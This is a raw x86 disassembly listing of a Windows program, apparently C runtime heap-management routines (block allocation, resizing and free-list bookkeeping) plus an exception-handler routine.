  42512f:	push   ecx
  425130:	push   ecx
  425131:	mov    ecx,DWORD PTR [ebp+0x8]
  425134:	mov    eax,DWORD PTR [ecx+0x8]
  425137:	push   ebx
  425138:	push   esi
  425139:	mov    esi,DWORD PTR [ecx+0x10]
  42513c:	push   edi
  42513d:	xor    ebx,ebx
  42513f:	jmp    0x425144
  425141:	shl    eax,1
  425143:	inc    ebx
  425144:	test   eax,eax
  425146:	jge    0x425141
  425148:	mov    eax,ebx
  42514a:	imul   eax,eax,0x204
  425150:	lea    eax,[eax+esi*1+0x144]
  425157:	push   0x3f
  425159:	mov    DWORD PTR [ebp-0x8],eax
  42515c:	pop    edx
  42515d:	mov    DWORD PTR [eax+0x8],eax
  425160:	mov    DWORD PTR [eax+0x4],eax
  425163:	add    eax,0x8
  425166:	dec    edx
  425167:	jne    0x42515d
  425169:	push   0x4
  42516b:	mov    edi,ebx
  42516d:	push   0x1000
  425172:	shl    edi,0xf
  425175:	add    edi,DWORD PTR [ecx+0xc]
  425178:	push   0x8000
  42517d:	push   edi
  42517e:	call   DWORD PTR ds:0x4280ec
  425184:	test   eax,eax
  425186:	jne    0x425190
  425188:	or     eax,0xffffffff
  42518b:	jmp    0x42522d
  425190:	lea    edx,[edi+0x7000]
  425196:	cmp    edi,edx
  425198:	mov    DWORD PTR [ebp-0x4],edx
  42519b:	ja     0x4251e0
  42519d:	mov    ecx,edx
  42519f:	sub    ecx,edi
  4251a1:	shr    ecx,0xc
  4251a4:	lea    eax,[edi+0x10]
  4251a7:	inc    ecx
  4251a8:	or     DWORD PTR [eax-0x8],0xffffffff
  4251ac:	or     DWORD PTR [eax+0xfec],0xffffffff
  4251b3:	lea    edx,[eax+0xffc]
  4251b9:	mov    DWORD PTR [eax],edx
  4251bb:	lea    edx,[eax-0x1004]
  4251c1:	mov    DWORD PTR [eax-0x4],0xff0
  4251c8:	mov    DWORD PTR [eax+0x4],edx
  4251cb:	mov    DWORD PTR [eax+0xfe8],0xff0
  4251d5:	add    eax,0x1000
  4251da:	dec    ecx
  4251db:	jne    0x4251a8
  4251dd:	mov    edx,DWORD PTR [ebp-0x4]
  4251e0:	mov    eax,DWORD PTR [ebp-0x8]
  4251e3:	add    eax,0x1f8
  4251e8:	lea    ecx,[edi+0xc]
  4251eb:	mov    DWORD PTR [eax+0x4],ecx
  4251ee:	mov    DWORD PTR [ecx+0x8],eax
  4251f1:	lea    ecx,[edx+0xc]
  4251f4:	mov    DWORD PTR [eax+0x8],ecx
  4251f7:	mov    DWORD PTR [ecx+0x4],eax
  4251fa:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  4251ff:	xor    edi,edi
  425201:	inc    edi
  425202:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425209:	mov    al,BYTE PTR [esi+0x43]
  42520c:	mov    cl,al
  42520e:	inc    cl
  425210:	test   al,al
  425212:	mov    eax,DWORD PTR [ebp+0x8]
  425215:	mov    BYTE PTR [esi+0x43],cl
  425218:	jne    0x42521d
  42521a:	or     DWORD PTR [eax+0x4],edi
  42521d:	mov    edx,0x80000000
  425222:	mov    ecx,ebx
  425224:	shr    edx,cl
  425226:	not    edx
  425228:	and    DWORD PTR [eax+0x8],edx
  42522b:	mov    eax,ebx
  42522d:	pop    edi
  42522e:	pop    esi
  42522f:	pop    ebx
  425230:	leave  
  425231:	ret    
  425232:	push   ebp
  425233:	mov    ebp,esp
  425235:	sub    esp,0xc
  425238:	mov    ecx,DWORD PTR [ebp+0x8]
  42523b:	mov    eax,DWORD PTR [ecx+0x10]
  42523e:	push   ebx
  42523f:	push   esi
  425240:	mov    esi,DWORD PTR [ebp+0x10]
  425243:	push   edi
  425244:	mov    edi,DWORD PTR [ebp+0xc]
  425247:	mov    edx,edi
  425249:	sub    edx,DWORD PTR [ecx+0xc]
  42524c:	add    esi,0x17
  42524f:	shr    edx,0xf
  425252:	mov    ecx,edx
  425254:	imul   ecx,ecx,0x204
  42525a:	lea    ecx,[ecx+eax*1+0x144]
  425261:	mov    DWORD PTR [ebp-0xc],ecx
  425264:	mov    ecx,DWORD PTR [edi-0x4]
  425267:	and    esi,0xfffffff0
  42526a:	dec    ecx
  42526b:	cmp    esi,ecx
  42526d:	lea    edi,[ecx+edi*1-0x4]
  425271:	mov    ebx,DWORD PTR [edi]
  425273:	mov    DWORD PTR [ebp+0x10],ecx
  425276:	mov    DWORD PTR [ebp-0x4],ebx
  425279:	jle    0x4253d4
  42527f:	test   bl,0x1
  425282:	jne    0x4253cd
  425288:	add    ebx,ecx
  42528a:	cmp    esi,ebx
  42528c:	jg     0x4253cd
  425292:	mov    ecx,DWORD PTR [ebp-0x4]
  425295:	sar    ecx,0x4
  425298:	dec    ecx
  425299:	cmp    ecx,0x3f
  42529c:	mov    DWORD PTR [ebp-0x8],ecx
  42529f:	jbe    0x4252a7
  4252a1:	push   0x3f
  4252a3:	pop    ecx
  4252a4:	mov    DWORD PTR [ebp-0x8],ecx
  4252a7:	mov    ebx,DWORD PTR [edi+0x4]
  4252aa:	cmp    ebx,DWORD PTR [edi+0x8]
  4252ad:	jne    0x4252f2
  4252af:	cmp    ecx,0x20
  4252b2:	mov    ebx,0x80000000
  4252b7:	jae    0x4252d3
  4252b9:	shr    ebx,cl
  4252bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4252be:	lea    ecx,[ecx+eax*1+0x4]
  4252c2:	not    ebx
  4252c4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  4252c8:	dec    BYTE PTR [ecx]
  4252ca:	jne    0x4252f2
  4252cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4252cf:	and    DWORD PTR [ecx],ebx
  4252d1:	jmp    0x4252f2
  4252d3:	add    ecx,0xffffffe0
  4252d6:	shr    ebx,cl
  4252d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4252db:	lea    ecx,[ecx+eax*1+0x4]
  4252df:	not    ebx
  4252e1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4252e8:	dec    BYTE PTR [ecx]
  4252ea:	jne    0x4252f2
  4252ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4252ef:	and    DWORD PTR [ecx+0x4],ebx
  4252f2:	mov    ecx,DWORD PTR [edi+0x8]
  4252f5:	mov    ebx,DWORD PTR [edi+0x4]
  4252f8:	mov    DWORD PTR [ecx+0x4],ebx
  4252fb:	mov    ecx,DWORD PTR [edi+0x4]
  4252fe:	mov    edi,DWORD PTR [edi+0x8]
  425301:	mov    DWORD PTR [ecx+0x8],edi
  425304:	mov    ecx,DWORD PTR [ebp+0x10]
  425307:	sub    ecx,esi
  425309:	add    DWORD PTR [ebp-0x4],ecx
  42530c:	cmp    DWORD PTR [ebp-0x4],0x0
  425310:	jle    0x4253bb
  425316:	mov    edi,DWORD PTR [ebp-0x4]
  425319:	mov    ecx,DWORD PTR [ebp+0xc]
  42531c:	sar    edi,0x4
  42531f:	dec    edi
  425320:	cmp    edi,0x3f
  425323:	lea    ecx,[ecx+esi*1-0x4]
  425327:	jbe    0x42532c
  425329:	push   0x3f
  42532b:	pop    edi
  42532c:	mov    ebx,DWORD PTR [ebp-0xc]
  42532f:	lea    ebx,[ebx+edi*8]
  425332:	mov    DWORD PTR [ebp+0x10],ebx
  425335:	mov    ebx,DWORD PTR [ebx+0x4]
  425338:	mov    DWORD PTR [ecx+0x4],ebx
  42533b:	mov    ebx,DWORD PTR [ebp+0x10]
  42533e:	mov    DWORD PTR [ecx+0x8],ebx
  425341:	mov    DWORD PTR [ebx+0x4],ecx
  425344:	mov    ebx,DWORD PTR [ecx+0x4]
  425347:	mov    DWORD PTR [ebx+0x8],ecx
  42534a:	mov    ebx,DWORD PTR [ecx+0x4]
  42534d:	cmp    ebx,DWORD PTR [ecx+0x8]
  425350:	jne    0x4253a9
  425352:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  425356:	mov    BYTE PTR [ebp+0x13],cl
  425359:	inc    cl
  42535b:	cmp    edi,0x20
  42535e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  425362:	jae    0x425380
  425364:	cmp    BYTE PTR [ebp+0x13],0x0
  425368:	jne    0x425378
  42536a:	mov    ecx,edi
  42536c:	mov    ebx,0x80000000
  425371:	shr    ebx,cl
  425373:	mov    ecx,DWORD PTR [ebp+0x8]
  425376:	or     DWORD PTR [ecx],ebx
  425378:	lea    eax,[eax+edx*4+0x44]
  42537c:	mov    ecx,edi
  42537e:	jmp    0x4253a0
  425380:	cmp    BYTE PTR [ebp+0x13],0x0
  425384:	jne    0x425396
  425386:	lea    ecx,[edi-0x20]
  425389:	mov    ebx,0x80000000
  42538e:	shr    ebx,cl
  425390:	mov    ecx,DWORD PTR [ebp+0x8]
  425393:	or     DWORD PTR [ecx+0x4],ebx
  425396:	lea    eax,[eax+edx*4+0xc4]
  42539d:	lea    ecx,[edi-0x20]
  4253a0:	mov    edx,0x80000000
  4253a5:	shr    edx,cl
  4253a7:	or     DWORD PTR [eax],edx
  4253a9:	mov    edx,DWORD PTR [ebp+0xc]
  4253ac:	mov    ecx,DWORD PTR [ebp-0x4]
  4253af:	lea    eax,[edx+esi*1-0x4]
  4253b3:	mov    DWORD PTR [eax],ecx
  4253b5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  4253b9:	jmp    0x4253be
  4253bb:	mov    edx,DWORD PTR [ebp+0xc]
  4253be:	lea    eax,[esi+0x1]
  4253c1:	mov    DWORD PTR [edx-0x4],eax
  4253c4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  4253c8:	jmp    0x425509
  4253cd:	xor    eax,eax
  4253cf:	jmp    0x42550c
  4253d4:	jge    0x425509
  4253da:	mov    ebx,DWORD PTR [ebp+0xc]
  4253dd:	sub    DWORD PTR [ebp+0x10],esi
  4253e0:	lea    ecx,[esi+0x1]
  4253e3:	mov    DWORD PTR [ebx-0x4],ecx
  4253e6:	lea    ebx,[ebx+esi*1-0x4]
  4253ea:	mov    esi,DWORD PTR [ebp+0x10]
  4253ed:	sar    esi,0x4
  4253f0:	dec    esi
  4253f1:	cmp    esi,0x3f
  4253f4:	mov    DWORD PTR [ebp+0xc],ebx
  4253f7:	mov    DWORD PTR [ebx-0x4],ecx
  4253fa:	jbe    0x4253ff
  4253fc:	push   0x3f
  4253fe:	pop    esi
  4253ff:	test   BYTE PTR [ebp-0x4],0x1
  425403:	jne    0x425489
  425409:	mov    esi,DWORD PTR [ebp-0x4]
  42540c:	sar    esi,0x4
  42540f:	dec    esi
  425410:	cmp    esi,0x3f
  425413:	jbe    0x425418
  425415:	push   0x3f
  425417:	pop    esi
  425418:	mov    ecx,DWORD PTR [edi+0x4]
  42541b:	cmp    ecx,DWORD PTR [edi+0x8]
  42541e:	jne    0x425462
  425420:	cmp    esi,0x20
  425423:	mov    ebx,0x80000000
  425428:	jae    0x425443
  42542a:	mov    ecx,esi
  42542c:	shr    ebx,cl
  42542e:	lea    esi,[esi+eax*1+0x4]
  425432:	not    ebx
  425434:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425438:	dec    BYTE PTR [esi]
  42543a:	jne    0x42545f
  42543c:	mov    ecx,DWORD PTR [ebp+0x8]
  42543f:	and    DWORD PTR [ecx],ebx
  425441:	jmp    0x42545f
  425443:	lea    ecx,[esi-0x20]
  425446:	shr    ebx,cl
  425448:	lea    ecx,[esi+eax*1+0x4]
  42544c:	not    ebx
  42544e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425455:	dec    BYTE PTR [ecx]
  425457:	jne    0x42545f
  425459:	mov    ecx,DWORD PTR [ebp+0x8]
  42545c:	and    DWORD PTR [ecx+0x4],ebx
  42545f:	mov    ebx,DWORD PTR [ebp+0xc]
  425462:	mov    ecx,DWORD PTR [edi+0x8]
  425465:	mov    esi,DWORD PTR [edi+0x4]
  425468:	mov    DWORD PTR [ecx+0x4],esi
  42546b:	mov    esi,DWORD PTR [edi+0x8]
  42546e:	mov    ecx,DWORD PTR [edi+0x4]
  425471:	mov    DWORD PTR [ecx+0x8],esi
  425474:	mov    esi,DWORD PTR [ebp+0x10]
  425477:	add    esi,DWORD PTR [ebp-0x4]
  42547a:	mov    DWORD PTR [ebp+0x10],esi
  42547d:	sar    esi,0x4
  425480:	dec    esi
  425481:	cmp    esi,0x3f
  425484:	jbe    0x425489
  425486:	push   0x3f
  425488:	pop    esi
  425489:	mov    ecx,DWORD PTR [ebp-0xc]
  42548c:	lea    ecx,[ecx+esi*8]
  42548f:	mov    edi,DWORD PTR [ecx+0x4]
  425492:	mov    DWORD PTR [ebx+0x8],ecx
  425495:	mov    DWORD PTR [ebx+0x4],edi
  425498:	mov    DWORD PTR [ecx+0x4],ebx
  42549b:	mov    ecx,DWORD PTR [ebx+0x4]
  42549e:	mov    DWORD PTR [ecx+0x8],ebx
  4254a1:	mov    ecx,DWORD PTR [ebx+0x4]
  4254a4:	cmp    ecx,DWORD PTR [ebx+0x8]
  4254a7:	jne    0x425500
  4254a9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4254ad:	mov    BYTE PTR [ebp+0xf],cl
  4254b0:	inc    cl
  4254b2:	cmp    esi,0x20
  4254b5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4254b9:	jae    0x4254d7
  4254bb:	cmp    BYTE PTR [ebp+0xf],0x0
  4254bf:	jne    0x4254cf
  4254c1:	mov    ecx,esi
  4254c3:	mov    edi,0x80000000
  4254c8:	shr    edi,cl
  4254ca:	mov    ecx,DWORD PTR [ebp+0x8]
  4254cd:	or     DWORD PTR [ecx],edi
  4254cf:	lea    eax,[eax+edx*4+0x44]
  4254d3:	mov    ecx,esi
  4254d5:	jmp    0x4254f7
  4254d7:	cmp    BYTE PTR [ebp+0xf],0x0
  4254db:	jne    0x4254ed
  4254dd:	lea    ecx,[esi-0x20]
  4254e0:	mov    edi,0x80000000
  4254e5:	shr    edi,cl
  4254e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4254ea:	or     DWORD PTR [ecx+0x4],edi
  4254ed:	lea    eax,[eax+edx*4+0xc4]
  4254f4:	lea    ecx,[esi-0x20]
  4254f7:	mov    edx,0x80000000
  4254fc:	shr    edx,cl
  4254fe:	or     DWORD PTR [eax],edx
  425500:	mov    eax,DWORD PTR [ebp+0x10]
  425503:	mov    DWORD PTR [ebx],eax
  425505:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425509:	xor    eax,eax
  42550b:	inc    eax
  42550c:	pop    edi
  42550d:	pop    esi
  42550e:	pop    ebx
  42550f:	leave  
  425510:	ret    
  425511:	push   ebp
  425512:	mov    ebp,esp
  425514:	sub    esp,0x14
  425517:	mov    ecx,DWORD PTR [ebp+0x8]
  42551a:	mov    eax,ds:0x46519c
  42551f:	mov    edx,DWORD PTR ds:0x4651a0
  425525:	add    ecx,0x17
  425528:	and    ecx,0xfffffff0
  42552b:	push   ebx
  42552c:	mov    DWORD PTR [ebp-0x10],ecx
  42552f:	sar    ecx,0x4
  425532:	push   esi
  425533:	lea    eax,[eax+eax*4]
  425536:	push   edi
  425537:	dec    ecx
  425538:	cmp    ecx,0x20
  42553b:	lea    edi,[edx+eax*4]
  42553e:	mov    DWORD PTR [ebp-0x4],edi
  425541:	jge    0x42554e
  425543:	or     esi,0xffffffff
  425546:	shr    esi,cl
  425548:	or     DWORD PTR [ebp-0x8],0xffffffff
  42554c:	jmp    0x42555b
  42554e:	add    ecx,0xffffffe0
  425551:	or     eax,0xffffffff
  425554:	xor    esi,esi
  425556:	shr    eax,cl
  425558:	mov    DWORD PTR [ebp-0x8],eax
  42555b:	mov    eax,ds:0x4651a8
  425560:	mov    ebx,eax
  425562:	mov    DWORD PTR [ebp-0xc],esi
  425565:	cmp    ebx,edi
  425567:	jmp    0x42557d
  425569:	mov    ecx,DWORD PTR [ebx+0x4]
  42556c:	mov    edi,DWORD PTR [ebx]
  42556e:	and    ecx,DWORD PTR [ebp-0x8]
  425571:	and    edi,esi
  425573:	or     ecx,edi
  425575:	jne    0x425582
  425577:	add    ebx,0x14
  42557a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42557d:	mov    DWORD PTR [ebp+0x8],ebx
  425580:	jb     0x425569
  425582:	cmp    ebx,DWORD PTR [ebp-0x4]
  425585:	jne    0x4255ab
  425587:	mov    ebx,edx
  425589:	jmp    0x42559c
  42558b:	mov    ecx,DWORD PTR [ebx+0x4]
  42558e:	mov    edi,DWORD PTR [ebx]
  425590:	and    ecx,DWORD PTR [ebp-0x8]
  425593:	and    edi,esi
  425595:	or     ecx,edi
  425597:	jne    0x4255a3
  425599:	add    ebx,0x14
  42559c:	cmp    ebx,eax
  42559e:	mov    DWORD PTR [ebp+0x8],ebx
  4255a1:	jb     0x42558b
  4255a3:	cmp    ebx,eax
  4255a5:	je     0x42563f
  4255ab:	mov    DWORD PTR ds:0x4651a8,ebx
  4255b1:	mov    eax,DWORD PTR [ebx+0x10]
  4255b4:	mov    edx,DWORD PTR [eax]
  4255b6:	cmp    edx,0xffffffff
  4255b9:	mov    DWORD PTR [ebp-0x4],edx
  4255bc:	je     0x4255d2
  4255be:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4255c5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4255c9:	and    ecx,DWORD PTR [ebp-0x8]
  4255cc:	and    edi,esi
  4255ce:	or     ecx,edi
  4255d0:	jne    0x425608
  4255d2:	mov    edx,DWORD PTR [eax+0xc4]
  4255d8:	and    edx,DWORD PTR [ebp-0x8]
  4255db:	and    DWORD PTR [ebp-0x4],0x0
  4255df:	lea    ecx,[eax+0x44]
  4255e2:	mov    esi,DWORD PTR [ecx]
  4255e4:	and    esi,DWORD PTR [ebp-0xc]
  4255e7:	or     edx,esi
  4255e9:	mov    esi,DWORD PTR [ebp-0xc]
  4255ec:	jne    0x425605
  4255ee:	mov    edx,DWORD PTR [ecx+0x84]
  4255f4:	and    edx,DWORD PTR [ebp-0x8]
  4255f7:	inc    DWORD PTR [ebp-0x4]
  4255fa:	add    ecx,0x4
  4255fd:	mov    edi,DWORD PTR [ecx]
  4255ff:	and    edi,esi
  425601:	or     edx,edi
  425603:	je     0x4255ee
  425605:	mov    edx,DWORD PTR [ebp-0x4]
  425608:	mov    ecx,edx
  42560a:	imul   ecx,ecx,0x204
  425610:	lea    ecx,[ecx+eax*1+0x144]
  425617:	mov    DWORD PTR [ebp-0xc],ecx
  42561a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42561e:	xor    edi,edi
  425620:	and    ecx,esi
  425622:	jne    0x425691
  425624:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42562b:	and    ecx,DWORD PTR [ebp-0x8]
  42562e:	push   0x20
  425630:	pop    edi
  425631:	jmp    0x425691
  425633:	cmp    DWORD PTR [ebx+0x8],0x0
  425637:	jne    0x425644
  425639:	add    ebx,0x14
  42563c:	mov    DWORD PTR [ebp+0x8],ebx
  42563f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425642:	jb     0x425633
  425644:	cmp    ebx,DWORD PTR [ebp-0x4]
  425647:	jne    0x42566f
  425649:	mov    ebx,edx
  42564b:	jmp    0x425656
  42564d:	cmp    DWORD PTR [ebx+0x8],0x0
  425651:	jne    0x42565d
  425653:	add    ebx,0x14
  425656:	cmp    ebx,eax
  425658:	mov    DWORD PTR [ebp+0x8],ebx
  42565b:	jb     0x42564d
  42565d:	cmp    ebx,eax
  42565f:	jne    0x42566f
  425661:	call   0x425075
  425666:	mov    ebx,eax
  425668:	test   ebx,ebx
  42566a:	mov    DWORD PTR [ebp+0x8],ebx
  42566d:	je     0x425687
  42566f:	push   ebx
  425670:	call   0x42512c
  425675:	pop    ecx
  425676:	mov    ecx,DWORD PTR [ebx+0x10]
  425679:	mov    DWORD PTR [ecx],eax
  42567b:	mov    eax,DWORD PTR [ebx+0x10]
  42567e:	cmp    DWORD PTR [eax],0xffffffff
  425681:	jne    0x4255ab
  425687:	xor    eax,eax
  425689:	jmp    0x425808
  42568e:	shl    ecx,1
  425690:	inc    edi
  425691:	test   ecx,ecx
  425693:	jge    0x42568e
  425695:	mov    ecx,DWORD PTR [ebp-0xc]
  425698:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42569c:	mov    ecx,DWORD PTR [edx]
  42569e:	sub    ecx,DWORD PTR [ebp-0x10]
  4256a1:	mov    esi,ecx
  4256a3:	sar    esi,0x4
  4256a6:	dec    esi
  4256a7:	cmp    esi,0x3f
  4256aa:	mov    DWORD PTR [ebp-0x8],ecx
  4256ad:	jle    0x4256b2
  4256af:	push   0x3f
  4256b1:	pop    esi
  4256b2:	cmp    esi,edi
  4256b4:	je     0x4257bb
  4256ba:	mov    ecx,DWORD PTR [edx+0x4]
  4256bd:	cmp    ecx,DWORD PTR [edx+0x8]
  4256c0:	jne    0x42571e
  4256c2:	cmp    edi,0x20
  4256c5:	mov    ebx,0x80000000
  4256ca:	jge    0x4256f2
  4256cc:	mov    ecx,edi
  4256ce:	shr    ebx,cl
  4256d0:	mov    ecx,DWORD PTR [ebp-0x4]
  4256d3:	lea    edi,[eax+edi*1+0x4]
  4256d7:	not    ebx
  4256d9:	mov    DWORD PTR [ebp-0x14],ebx
  4256dc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4256e0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4256e4:	dec    BYTE PTR [edi]
  4256e6:	jne    0x42571b
  4256e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4256eb:	mov    ebx,DWORD PTR [ebp+0x8]
  4256ee:	and    DWORD PTR [ebx],ecx
  4256f0:	jmp    0x42571e
  4256f2:	lea    ecx,[edi-0x20]
  4256f5:	shr    ebx,cl
  4256f7:	mov    ecx,DWORD PTR [ebp-0x4]
  4256fa:	lea    ecx,[eax+ecx*4+0xc4]
  425701:	lea    edi,[eax+edi*1+0x4]
  425705:	not    ebx
  425707:	and    DWORD PTR [ecx],ebx
  425709:	dec    BYTE PTR [edi]
  42570b:	mov    DWORD PTR [ebp-0x14],ebx
  42570e:	jne    0x42571b
  425710:	mov    ebx,DWORD PTR [ebp+0x8]
  425713:	mov    ecx,DWORD PTR [ebp-0x14]
  425716:	and    DWORD PTR [ebx+0x4],ecx
  425719:	jmp    0x42571e
  42571b:	mov    ebx,DWORD PTR [ebp+0x8]
  42571e:	cmp    DWORD PTR [ebp-0x8],0x0
  425722:	mov    ecx,DWORD PTR [edx+0x8]
  425725:	mov    edi,DWORD PTR [edx+0x4]
  425728:	mov    DWORD PTR [ecx+0x4],edi
  42572b:	mov    ecx,DWORD PTR [edx+0x4]
  42572e:	mov    edi,DWORD PTR [edx+0x8]
  425731:	mov    DWORD PTR [ecx+0x8],edi
  425734:	je     0x4257c7
  42573a:	mov    ecx,DWORD PTR [ebp-0xc]
  42573d:	lea    ecx,[ecx+esi*8]
  425740:	mov    edi,DWORD PTR [ecx+0x4]
  425743:	mov    DWORD PTR [edx+0x8],ecx
  425746:	mov    DWORD PTR [edx+0x4],edi
  425749:	mov    DWORD PTR [ecx+0x4],edx
  42574c:	mov    ecx,DWORD PTR [edx+0x4]
  42574f:	mov    DWORD PTR [ecx+0x8],edx
  425752:	mov    ecx,DWORD PTR [edx+0x4]
  425755:	cmp    ecx,DWORD PTR [edx+0x8]
  425758:	jne    0x4257b8
  42575a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42575e:	mov    BYTE PTR [ebp+0xb],cl
  425761:	inc    cl
  425763:	cmp    esi,0x20
  425766:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42576a:	jge    0x42578f
  42576c:	cmp    BYTE PTR [ebp+0xb],0x0
  425770:	jne    0x42577d
  425772:	mov    edi,0x80000000
  425777:	mov    ecx,esi
  425779:	shr    edi,cl
  42577b:	or     DWORD PTR [ebx],edi
  42577d:	mov    ecx,esi
  42577f:	mov    edi,0x80000000
  425784:	shr    edi,cl
  425786:	mov    ecx,DWORD PTR [ebp-0x4]
  425789:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42578d:	jmp    0x4257b8
  42578f:	cmp    BYTE PTR [ebp+0xb],0x0
  425793:	jne    0x4257a2
  425795:	lea    ecx,[esi-0x20]
  425798:	mov    edi,0x80000000
  42579d:	shr    edi,cl
  42579f:	or     DWORD PTR [ebx+0x4],edi
  4257a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4257a5:	lea    edi,[eax+ecx*4+0xc4]
  4257ac:	lea    ecx,[esi-0x20]
  4257af:	mov    esi,0x80000000
  4257b4:	shr    esi,cl
  4257b6:	or     DWORD PTR [edi],esi
  4257b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4257bb:	test   ecx,ecx
  4257bd:	je     0x4257ca
  4257bf:	mov    DWORD PTR [edx],ecx
  4257c1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4257c5:	jmp    0x4257ca
  4257c7:	mov    ecx,DWORD PTR [ebp-0x8]
  4257ca:	mov    esi,DWORD PTR [ebp-0x10]
  4257cd:	add    edx,ecx
  4257cf:	lea    ecx,[esi+0x1]
  4257d2:	mov    DWORD PTR [edx],ecx
  4257d4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4257d8:	mov    esi,DWORD PTR [ebp-0xc]
  4257db:	mov    ecx,DWORD PTR [esi]
  4257dd:	test   ecx,ecx
  4257df:	lea    edi,[ecx+0x1]
  4257e2:	mov    DWORD PTR [esi],edi
  4257e4:	jne    0x425800
  4257e6:	cmp    ebx,DWORD PTR ds:0x465198
  4257ec:	jne    0x425800
  4257ee:	mov    ecx,DWORD PTR [ebp-0x4]
  4257f1:	cmp    ecx,DWORD PTR ds:0x4651b0
  4257f7:	jne    0x425800
  4257f9:	and    DWORD PTR ds:0x465198,0x0
  425800:	mov    ecx,DWORD PTR [ebp-0x4]
  425803:	mov    DWORD PTR [eax],ecx
  425805:	lea    eax,[edx+0x4]
  425808:	pop    edi
  425809:	pop    esi
  42580a:	pop    ebx
  42580b:	leave  
  42580c:	ret    
  42580d:	int3   
  42580e:	int3   
  42580f:	int3   
  425810:	push   esi
  425811:	inc    ebx
  425812:	xor    dh,BYTE PTR [eax]
  425814:	pop    eax
  425815:	inc    ebx
  425816:	xor    BYTE PTR [eax],dh
  425818:	push   ebp
  425819:	mov    ebp,esp
  42581b:	sub    esp,0x8
  42581e:	push   ebx
  42581f:	push   esi
  425820:	push   edi
  425821:	push   ebp
  425822:	cld    
  425823:	mov    ebx,DWORD PTR [ebp+0xc]
  425826:	mov    eax,DWORD PTR [ebp+0x8]
  425829:	test   DWORD PTR [eax+0x4],0x6
  425830:	jne    0x4258b8
  425836:	mov    DWORD PTR [ebp-0x8],eax
  425839:	mov    eax,DWORD PTR [ebp+0x10]
  42583c:	mov    DWORD PTR [ebp-0x4],eax
  42583f:	lea    eax,[ebp-0x8]
  425842:	mov    DWORD PTR [ebx-0x4],eax
  425845:	mov    esi,DWORD PTR [ebx+0xc]
  425848:	mov    edi,DWORD PTR [ebx+0x8]
  42584b:	cmp    esi,0xffffffff
  42584e:	je     0x4258b1
  425850:	lea    ecx,[esi+esi*2]
  425853:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  425858:	je     0x42589f
  42585a:	push   esi
  42585b:	push   ebp
  42585c:	lea    ebp,[ebx+0x10]
  42585f:	call   DWORD PTR [edi+ecx*4+0x4]
  425863:	pop    ebp
  425864:	pop    esi
  425865:	mov    ebx,DWORD PTR [ebp+0xc]
  425868:	or     eax,eax
  42586a:	je     0x42589f
  42586c:	js     0x4258aa
  42586e:	mov    edi,DWORD PTR [ebx+0x8]
  425871:	push   ebx
  425872:	call   0x4267a0
  425877:	add    esp,0x4
  42587a:	lea    ebp,[ebx+0x10]
  42587d:	push   esi
  42587e:	push   ebx
  42587f:	call   0x4267e2
  425884:	add    esp,0x8
  425887:	lea    ecx,[esi+esi*2]
  42588a:	push   0x1
  42588c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  425890:	call   0x426876
  425895:	mov    eax,DWORD PTR [edi+ecx*4]
  425898:	mov    DWORD PTR [ebx+0xc],eax
  42589b:	call   DWORD PTR [edi+ecx*4+0x8]
  42589f:	mov    edi,DWORD PTR [ebx+0x8]
  4258a2:	lea    ecx,[esi+esi*2]
  4258a5:	mov    esi,DWORD PTR [edi+ecx*4]
  4258a8:	jmp    0x42584b
  4258aa:	mov    eax,0x0
  4258af:	jmp    0x4258cd
  4258b1:	mov    eax,0x1
  4258b6:	jmp    0x4258cd
  4258b8:	push   ebp
  4258b9:	lea    ebp,[ebx+0x10]
  4258bc:	push   0xffffffff
  4258be:	push   ebx
  4258bf:	call   0x4267e2
  4258c4:	add    esp,0x8
  4258c7:	pop    ebp
  4258c8:	mov    eax,0x1
  4258cd:	pop    ebp
  4258ce:	pop    edi
  4258cf:	pop    esi
  4258d0:	pop    ebx
  4258d1:	mov    esp,ebp
  4258d3:	pop    ebp
  4258d4:	ret    
  4258d5:	push   ebp
  4258d6:	mov    ecx,DWORD PTR [esp+0x8]
  4258da:	mov    ebp,DWORD PTR [ecx]
  4258dc:	mov    eax,DWORD PTR [ecx+0x1c]
  4258df:	push   eax
  4258e0:	mov    eax,DWORD PTR [ecx+0x18]
  4258e3:	push   eax
  4258e4:	call   0x4267e2
  4258e9:	add    esp,0x8
  4258ec:	pop    ebp
  4258ed:	ret    0x4
  4258f0:	call   0x423803
  4258f5:	add    eax,0x8
  4258f8:	ret    
  4258f9:	push   0x14
  4258fb:	push   0x4287c0
  425900:	call   0x423950
  425905:	mov    edi,DWORD PTR [ebp+0x8]
  425908:	xor    ebx,ebx
  42590a:	cmp    edi,ebx
  42590c:	jne    0x42591c
  42590e:	push   DWORD PTR [ebp+0xc]
  425911:	call   0x424672
  425916:	pop    ecx
